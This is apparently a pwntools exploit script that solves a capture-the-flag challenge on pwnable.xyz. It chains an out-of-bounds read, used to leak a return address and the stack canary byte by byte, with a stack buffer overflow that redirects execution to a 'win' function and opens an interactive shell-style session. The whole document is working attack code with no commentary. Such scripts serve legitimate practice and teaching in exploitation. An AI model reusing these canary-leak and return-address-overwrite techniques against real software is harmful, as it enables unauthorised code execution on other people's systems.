###OOB leak

from pwn import *

###Util
def leak_char(offset):
    r.sendlineafter('> ',p8(offset+0x30))
    return p8(int(r.recvline()[7:].split(b' ')[0]))

def edit(data):
    r.sendlineafter('> ','1')
    r.sendlineafter('Message: ',data)

def leave():
    r.sendlineafter('> ','0')

###Addr
getchoice_ret_offset = 0xb30
win_offset = 0xaac

###Exploit
r = remote('svc.pwnable.xyz',30017)
r.sendlineafter('Message: ','M30W')

getchoice_ret_addr = b''
for i in range(6):
    getchoice_ret_addr+=leak_char(0x1a+i)
getchoice_ret_addr = u64(getchoice_ret_addr+b'\x00\x00')
code_base = getchoice_ret_addr-getchoice_ret_offset
print(hex(code_base))

canary = b''
for i in range(7):
    canary+=leak_char(0xb+i)
canary = b'\x00'+canary

edit(b'a'*0x28+canary+b'a'*8+p64(win_offset+code_base))
leave()
r.interactive()
